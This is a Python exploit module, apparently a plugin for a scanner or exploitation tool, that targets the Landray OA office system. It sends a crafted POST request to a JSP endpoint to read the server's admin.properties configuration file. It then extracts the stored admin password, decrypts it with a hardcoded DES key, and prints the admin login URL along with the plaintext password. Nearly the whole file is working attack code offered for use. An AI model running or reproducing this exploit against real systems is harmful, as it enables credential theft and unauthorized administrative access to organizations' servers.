from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.clasetting import des_dec
import lib.util.globalvar as GlobalVar
import re
"""
+-------------+------------------------+---------------------------------------------+
| Target type | Vuln Name              | Impact Version && Vulnerability description |
+-------------+------------------------+---------------------------------------------+
| oa_landray  | cve_custom_filereading | [file reading] app="Landray-OA系统"          |
+-------------+------------------------+---------------------------------------------+
"""
class oa_landray():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        # self.status = env.get('status')
            
    def cve_custom_filereading(self):
        appName = 'oa_landray'
        pocname = 'cve_custom_filereading'
        path = '/sys/ui/extend/varkind/custom.jsp'
        method = 'post'
        desc = '[file reading] app="Landray-OA系统"'
        data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers)
                if r"password" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers).text
                pwd = re.search(r'password = (.*)\\r', result).group(1)
                #默认只取前8位密钥
                pwd = des_dec(pwd, 'kmssAdminKey'[0:8])
                print('[+]登录地址: %s ,登录密码: %s'%(self.url+'/admin.do',pwd))
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpLandrayOA = oa_landray(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpLandrayOA, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(oa_landray):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpLandrayOA, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)